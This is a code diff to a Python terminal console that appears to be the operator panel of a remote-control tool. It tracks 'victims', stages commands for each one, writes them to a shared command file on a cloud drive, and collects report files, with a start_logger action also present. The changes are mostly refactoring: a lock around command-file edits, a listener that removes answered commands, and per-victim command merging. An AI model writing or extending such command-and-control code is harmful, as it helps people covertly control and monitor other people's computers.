@@ -1,8 +1,9 @@
 #%%
 import random
+import re
 import json
 from clint.network import net_time
-from threading import Thread
+from threading import Lock, Thread
 import atexit
 from server.util import data_store
 from server.util import force_stop
@@ -17,7 +18,7 @@ from functools import lru_cache
 from math import ceil
 import curses
 import sys
-from os.path import join
+from os.path import join, split
 from curses import textpad
 from collections import OrderedDict
 from collections.abc import Iterable
@@ -34,6 +35,7 @@ token_file=data_store.var.token_file
 command_file=data_store.var.command_file
 bucket_port=data_store.var.bucket_port
 last_time=data_store.var.last_time
+listen_for=data_store.var.listen_for
 
 #%%
 def init_console():
@@ -144,9 +146,7 @@ def clear():
     window.refresh()
 
 
-
 victims=[]
-
 
 class Home:
     circle = "●"
@@ -442,17 +442,39 @@ class Home:
             window.refresh()
 home_page=Home()
 
-listen_for=[]
+
+modify_command=Lock()# accure while modifying command_file or listen_for
 def listener():
     while 1:
         for i in listen_for:
-            if source_drive.exists(i):
-                log.info(f'file listener found a file. "{i}"')
-                move_file(i)
-            else:
+            if not source_drive.exists(i):
                 sleep(2)
+                continue
+
+            log.info(f'file listener found a file. "{i}"')
+            move_file(i)
+            
+            # remove the respective command from command file
+            uname=split(split(i)[0])[1]
+            ctime=re.search(r"\d+", i).group() # command time
+            modify_command.acquire()
+
+            with drive_file(command_file) as f:
+                commands:list = json.loads(f.read())[uname]
+            
+            for command in commands:
+                if command['time']==ctime:
+                    commands.remove(command)
+                    break
+            
+            with drive_file(command_file) as f:
+                f.rewrite(commands)
+            
+            modify_command.release()
+        
+
         sleep(10)
-    
+
 class Tokener:
     def __init__(self):
         self.core = Thread(target=self.update_token, daemon=True, name='tokener')
@@ -533,6 +555,7 @@ class Option_view:
     def __init__(self, opt_lst, opt_win=window):
         self.opt_lst=opt_lst
         self.opt_win=opt_win
+        self.opt_win.keypad(True)
 
         self.step=2
         self.cursor=0
@@ -548,17 +571,18 @@ class Option_view:
         
         self.position=[]
 
-    def show(self):
+    def resize(self):
         self.opt_win.clear()
-        self.opt_win.keypad(True)
         self.print_opt()
-        
+
+    def show(self):
+        self.resize()
         while 1:
             key=self.opt_win.getch()
             if key==curses.ascii.ESC:
                 self.exit()
                 return
-
+            
             self.key_map.get(int(key), lambda :None)()
 
     def color_back(self):
@@ -582,8 +606,8 @@ class Option_view:
         self.position=middle_print_lst(self.opt_win, self.opt_lst, self.step)
         self.color()
 
-        self.opt_win.refresh()
-        self.opt_win.getch()
+        # self.opt_win.refresh()
+        # self.opt_win.getch()
 
     def up(self):
         if self.cursor!=0:
@@ -600,7 +624,7 @@ class Option_view:
     def enter(self):
         key=list(self.opt_lst.keys())[self.cursor]
         self.opt_lst[key][0]()
-        self.show()
+        self.resize()
 
     def exit(self):
         pass
@@ -623,9 +647,7 @@ class Multi_opt(Option_view):
         super().__init__(opt_lst, opt_win)
 
     def show(self):
-        self.opt_win.keypad(True)
-        self.print_opt()
-        
+        self.resize()
         while 1:
             key=self.opt_win.getch()
             if key==curses.ascii.ESC:
@@ -661,10 +683,7 @@ class Single_opt(Option_view):
         super().__init__(opt_lst, opt_win)
     
     def show(self):
-        self.opt_win.clear()
-        self.opt_win.keypad(True)
-        self.print_opt()
-        
+        self.resize()
         while 1:
             key=self.opt_win.getch()
             if key==curses.ascii.ESC:
@@ -685,11 +704,8 @@ class action:
 
         self.vic_name = vic_name
         self.last_time = last_time.get(vic_name, 0)
-        self.commands={
-            self.vic_name:[]
-        }# also this one # previous command that is not responsed
+        self.commands=[]# also this one # previous command that is not responsed
         
-
         clear()
         sh, sw = window.getmaxyx()
         opt_box = OrderedDict({
@@ -781,10 +797,9 @@ class action:
             "kwargs":kv
         }
         
-        if key=="last_user_time":
-            self.last_time=p
-
         self.stage(command)
+        if key=="last_user_time":# this must be happen after staging
+            self.last_time=int(p)
         clear()
 
     def start_logger(self):
@@ -812,13 +827,15 @@ class action:
         clear()
 
 
-    def add_to_listen(self, name:str):
-        path=join("report", self.vic_name)
+    def add_to_listen(self, file_name:str):
+        path=join("reports", self.vic_name)
         
         # name, _, ext=name.rpartition(".")
         # path = join(path, f"{name}_{self.last_time}.{ext}")
-        path=join(path, name)
-        listen_for.append(path)
+        path=join(path, file_name)
+        with modify_command:
+            listen_for.append(path)
+            data_store.commit()
 
     def included(self, command):
         for i in self.commands:
@@ -829,6 +846,15 @@ class action:
             i['time']=ltime
         return False
 
+    def extend(self, commands):
+        for i in commands:
+            itime=i.pop('time')
+            if not self.included(i):
+                i['time']=itime
+                self.commands.append(i)
+            else:
+                i['time']=itime
+
     def stage(self, command):
         log.info(f"staged {command['func']} function")
         log.debug(f"staged full command: {command}")
@@ -837,7 +863,7 @@ class action:
 
         self.last_time+=1
         command["time"]=self.last_time
-        self.commands[self.vic_name].append(command)
+        self.commands.append(command)
         return self.last_time
     
     def commit(self):
@@ -845,13 +871,19 @@ class action:
         if not self.commands:
             return
 
-        with drive_file(command_file) as f:
-            pre_com:dict=json.loads(f.read()or"{}")
-            self.commands.update(pre_com)
-            f.rewrite(self.commands)
+        with drive_file(command_file) as f, modify_command:
+            pre_com:dict=json.loads(f.read() or "{}")
+            pre_com=pre_com.get(self.vic_name, [])
+
+            self.extend(pre_com)
+            f.rewrite({
+                self.vic_name:self.commands
+            })
 
         last_time[self.vic_name]=self.last_time
         data_store.set_value('last_time', last_time)
+        self.commands=[]
+        return
 
 
 
